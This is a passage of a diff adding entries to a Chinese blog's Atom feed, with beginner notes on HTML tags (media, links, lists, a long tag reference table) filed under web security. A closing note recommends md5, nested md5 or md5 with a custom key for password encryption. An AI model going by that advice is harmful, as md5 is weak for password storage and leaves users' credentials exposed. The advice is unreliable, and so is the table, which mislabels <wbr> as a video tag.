src=””&gt;</p><p><canvas>画布</canvas></p><p>&lt;*map&gt;定义热区</p><h4 id="5、媒体标签："><a href="#5、媒体标签：" class="headerlink" title="5、媒体标签："></a>5、媒体标签：</h4><p>*<audio src controls="controls"></audio><br>*<video src controls="controls"></video></p><p>*<track src="*.vtt">外部文本轨道</p><h4 id="6、链接标签："><a href="#6、链接标签：" class="headerlink" title="6、链接标签："></a>6、链接标签：</h4><p>&lt;*a href=”javascript:void(0);”&gt;链接</p><link href="css" rel>定义与外部资源的关系<nav>导航链接</nav>：H5的新标签<p>&lt;*nav&gt;</p><p><a href></a></p><h4 id="7、其他标签："><a href="#7、其他标签：" class="headerlink" title="7、其他标签："></a>7、其他标签：</h4><p>*<ul>无序列表</ul></p><p>*<ol>有序列表</ol></p><p>*<li>列表项</li></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564498665758.png" alt="1564498665758"></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564498685330.png" alt="1564498685330"></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564498706872.png" alt="1564498706872"></p><p><img src="C:%5CUsers%5Czhairui%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1564498714439.png" alt="1564498714439"></p><p>Js的基本应用<br>Document：当前的文本对象，里面有当前访问页面的所有标签</p><p>出现密码没有加密的情况：<br>输入时开始加密<br>加密方法：md5（）<br>Md5（md5（））<br>Md5（md5（“密码”）+“自定义密钥”）</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;HTML基本介绍&quot;&gt;&lt;a href=&quot;#HTML基本介绍&quot; class=&quot;headerlink&quot; title=&quot;HTML基本介绍&quot;&gt;&lt;/a&gt;HTML基本介绍&lt;/h1&gt;&lt;h2 id=&quot;概念：&quot;&gt;&lt;a href=&quot;#概念：&quot; class=&quot;headerlink&quot; ti
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTML标签</title>
+    <link href="http://yoursite.com/2019/08/09/HTML%E6%A0%87%E7%AD%BE/"/>
+    <id>http://yoursite.com/2019/08/09/HTML标签/</id>
+    <published>2019-08-09T14:47:28.357Z</published>
+    <updated>2019-08-09T14:58:42.347Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="HTML标签："><a href="#HTML标签：" class="headerlink" title="HTML标签："></a>HTML标签：</h1><p>标签名                   描述</p><p><code>&lt;!--...--&gt;</code>        定义注释</p><p><code>&lt;!DOCTYPE&gt;</code>        定义文档类型</p><p><code>&lt;a&gt;</code>                定义锚</p><p><code>&lt;abbr&gt;</code>            定义缩写</p><p><code>&lt;acronym&gt;</code>         定义只取首字母的缩写</p><p><code>&lt;applet&gt;</code>           定义嵌入的applet（不赞成使用）</p><p><code>&lt;area&gt;</code>            定义图像映射内部的区域</p><p><code>&lt;article&gt;</code>         定义文章</p><p><code>&lt;aside&gt;</code>              定义页面内容之外的内容</p><p><code>&lt;audio&gt;</code>            定义声音内容</p><p><code>&lt;b&gt;</code>            定义粗体字</p><p><code>&lt;base&gt;</code>        定义页面中所有链接的默认地址或默认目</p><p><code>&lt;basefont&gt;</code>    定义页面中文本的默认字体、颜色尺寸（不赞成使用）</p><p><code>&lt;bdi&gt;</code>        定义文本的文本方向，使其脱离周围文本的方向设置</p><p><code>&lt;bdo&gt;</code>        定义文字方向</p><p><code>&lt;big&gt;</code>        定义大号文本</p><p><code>&lt;blockquote&gt;</code>    定义长的引用</p><p><code>&lt;body&gt;</code>        定义文档的主体</p><p><code>&lt;br&gt;</code>        定义简单的折行</p><p><code>&lt;button&gt;</code>        定义按钮（push button）</p><p><code>&lt;canvas&gt;</code>        定义图形</p><p><code>&lt;caption&gt;</code>    定义表格标题</p><p><code>&lt;center&gt;</code>        定义居中文本（不赞成使用）</p><p><code>&lt;cite&gt;</code>        定义引用（citation）</p><p><code>&lt;code&gt;</code>        定义计算机代码文本</p><p><code>&lt;col&gt;</code>        定义表格中一个或多个列的属性值</p><p><code>&lt;colgroup&gt;</code>    定义表格中供格式化的列组</p><p><code>&lt;command&gt;</code>    定义命令按钮</p><p><code>&lt;datalist&gt;</code>    定义下拉列表</p><p><code>&lt;dd&gt;</code>        定义列表中项目的描述</p><p><code>&lt;del&gt;</code>        定义被删除的文本</p><p><code>&lt;details&gt;</code>        定义元素细节</p><p><code>&lt;dir&gt;</code>        定义目录列表（不赞成使用）</p><p><code>&lt;div&gt;</code>        定义文档中的节</p><p><code>&lt;dfn&gt;</code>        定义项目</p><p><code>&lt;dialog&gt;</code>        定义对话框或窗口</p><p><code>&lt;dt&gt;</code>        定义列表中的项目</p><p><code>&lt;em&gt;</code>        定义强调文本</p><p><code>&lt;embed&gt;</code>        定义外部交互内容或插件</p><p><code>&lt;fieldset&gt;</code>    定义围绕表单中元素的边框</p><p><code>&lt;figcaption&gt;</code>    定义figure元素标题</p><p><code>&lt;figure&gt;</code>        定义媒介内容的分组，以及它们的标题</p><p><code>&lt;font&gt;</code>        定义文字的字体、尺寸和颜色</p><p><code>&lt;footer&gt;</code>        定义section或page的页脚</p><p><code>&lt;form&gt;</code>        定义供用户输入的HTML表单</p><p><code>&lt;frame&gt;</code>        定义框架集的窗口或框架</p><p><code>&lt;frameset&gt;</code>    定义框架集</p><p><code>&lt;h1&gt;</code>to<code>&lt;h6&gt;</code>    定义HTML标题</p><p><code>&lt;head&gt;</code>        定义关于文档的信息</p><p><code>&lt;header&gt;</code>        定义section或page的页眉</p><p><code>&lt;hr&gt;</code>        定义水平线</p><p><code>&lt;html&gt;</code>        定义HTML文档</p><p><code>&lt;i&gt;</code>        定义斜体字</p><p><code>&lt;iframe&gt;</code>        定义内联框架</p><p><code>&lt;img&gt;</code>        定义图像</p><p><code>&lt;input&gt;</code>        定义输出控件</p><p><code>&lt;ins&gt;</code>        定义被插入文本</p><p><code>&lt;isindex&gt;</code>        定义与文档相关的可搜索索引</p><p><code>&lt;kbd&gt;</code>        定义键盘文本</p><p><code>&lt;keygen&gt;</code>    定义生成密钥</p><p><code>&lt;label&gt;</code>        定义input元素的标注</p><p><code>&lt;legend&gt;</code>        定义fieldset元素的标题</p><p><code>&lt;li&gt;</code>        定义列表中的项目</p><p><code>&lt;link&gt;</code>        定义文档与外部资源的关系</p><p><code>&lt;map&gt;</code>        定义图像映射</p><p><code>&lt;mark&gt;</code>        定义有记号的文本</p><p><code>&lt;menu&gt;</code>        定义菜单列表</p><p><code>&lt;meta&gt;</code>        定义关于HTML文档的元信息</p><p><code>&lt;meter&gt;</code>        定义预定义范围内的度量</p><p><code>&lt;nav&gt;</code>        定义导航链接</p><p><code>&lt;noframe&gt;</code>    定义针对不支持框架的用户的替代内容</p><p><code>&lt;noscript&gt;</code>    定义针对不支持客户端脚本的用户的替代内容</p><p><code>&lt;object&gt;</code>        定义内嵌对象</p><p><code>&lt;ol&gt;</code>        定义有序列表</p><p><code>&lt;optgroup&gt;</code>    定义选择列表中相关选项的组合</p><p><code>&lt;option&gt;</code>        定义选择列表中的选项</p><p><code>&lt;output&gt;</code>        定义输出的一些类型</p><p><code>&lt;p&gt;</code>        定义段落</p><p><code>&lt;param&gt;</code>        定义对象的参数</p><p><code>&lt;pre&gt;</code>        定义预格式文本</p><p><code>&lt;progress&gt;</code>    定义任何类型的任务的进度</p><p><code>&lt;q&gt;</code>        定义短的引用</p><p><code>&lt;rp&gt;</code>        定义若浏览器不支持ruby元素显示的内容</p><p><code>&lt;rt&gt;</code>        定义ruby注释的解释</p><p><code>&lt;ruby&gt;</code>        定义ruby注释</p><p><code>&lt;s&gt;</code>        定义加删除线的文本</p><p><code>&lt;samp&gt;</code>        定义计算机代码样本</p><p><code>&lt;script&gt;</code>        定义客户端脚本</p><p><code>&lt;section&gt;</code>        定义section</p><p><code>&lt;select&gt;</code>        定义选择列表（下拉列表）</p><p><code>&lt;small&gt;</code>        定义小号文本</p><p><code>&lt;source&gt;</code>        定义媒介源</p><p><code>&lt;span&gt;</code>        定义文档中的节</p><p><code>&lt;strike&gt;</code>        定义加删除线的文本</p><p><code>&lt;strong&gt;</code>        定义强调文本</p><p><code>&lt;style&gt;</code>        定义文档的样式信息</p><p><code>&lt;sub&gt;</code>        定义下标文本</p><p><code>&lt;summary&gt;</code>    为<code>&lt;details&gt;</code>元素定义可见的标题</p><p><code>&lt;sup&gt;</code>        定义上标文本</p><p><code>&lt;table&gt;</code>        定义表格</p><p><code>&lt;tbody&gt;</code>        定义表格中的主题内容</p><p><code>&lt;td&gt;</code>        定义表格中的单元</p><p><code>&lt;textarea&gt;</code>    定义多行的文本输入控件</p><p><code>&lt;tfoot&gt;</code>        定义表格中的表注内容（脚注）</p><p><code>&lt;th&gt;</code>        定义表格中的表头单元格</p><p><code>&lt;thead&gt;</code>        定义表格中的表头内容</p><p><code>&lt;time&gt;</code>        定义日期时间</p><p><code>&lt;title&gt;</code>        定义文档的标题</p><p><code>&lt;tr&gt;</code>        定义表格中的行</p><p><code>&lt;track&gt;</code>        定义用在媒体播放器中的文本轨道</p><p><code>&lt;tt&gt;</code>        定义打字机文本</p><p><code>&lt;u&gt;</code>        定义下划线文本</p><p><code>&lt;ul&gt;</code>        定义无序列表</p><p><code>&lt;var&gt;</code>        定义文本的变量部分</p><p><code>&lt;video&gt;</code>        定义视频</p><p><code>&lt;wbr&gt;</code>        定义视频</p><p><code>&lt;xmp&gt;</code>        定义预格式文本</p><p><code>&lt;dl&gt;</code>        定义列表</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;HTML标签：&quot;&gt;&lt;a href=&quot;#HTML标签：&quot; class=&quot;headerlink&quot; title=&quot;HTML标签：&quot;&gt;&lt;/a&gt;HTML标签：&lt;/h1&gt;&lt;p&gt;标签名                   描述&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;!--...--
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="HTML" scheme="http://yoursite.com/tags/HTML/"/>
+    
+  </entry>
+  
+</feed>
